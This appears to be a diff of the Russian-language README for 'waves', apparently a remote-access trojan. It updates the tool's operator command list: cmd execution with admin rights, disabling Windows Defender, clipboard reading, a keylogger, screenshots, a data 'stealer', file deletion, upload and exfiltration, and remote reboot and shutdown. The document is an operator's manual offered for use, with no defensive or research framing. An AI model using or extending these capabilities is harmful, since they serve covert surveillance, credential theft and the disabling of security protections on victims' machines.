@@ -7,25 +7,29 @@
 
 # Список команд
 ```
-!all <command> - выполнить комманду для всех пользователей
+!all <command> - выполнить команду для всех пользователей
 !all online - просмотреть кто в сети
 !ID admin1 <command> - отправить команду с правами админа
 !ID admin2 <command> - отправить команду с правами админа 2
 !ID antivirus - проверить включён ли windows defender
-!ID clipboard - посмотреть буфер обмена
+!ID cb - посмотреть буфер обмена
 !ID console - отправить команду из cmd
 !ID defender <on/off> - включить/выключить defender
+!ID delete <path> - удалить файл/папку
 !ID dir <path> - посмотреть директорию папки
-!ID download <name> - скачать файл
+!ID upload <path> - скачать файл
 !ID keylogger <start/stop> - включить/выключить keylogger
 !ID message <message> - отправить оконное сообщение
+!ID pack <path> <zip> - упаковать папку в архив
 !ID push <message> - отправить push уведомление
+!ID reboot - перезапустить компьютер
 !ID screenshot - получить скриншот
 !ID start <file> - запустить файл/сайт
 !ID stealer - застиллить все данные
+!ID shutdown - выключить компьютер
 !ID tasklist - список текущих процессов
 !ID update - обновить до последней версии waves
-!ID upload <url> <path> - скачать файл по ссылке
+!ID download <site> <path> - скачать файл по ссылке
 !ID version - посмотреть версию waves
 ```
 # Использование
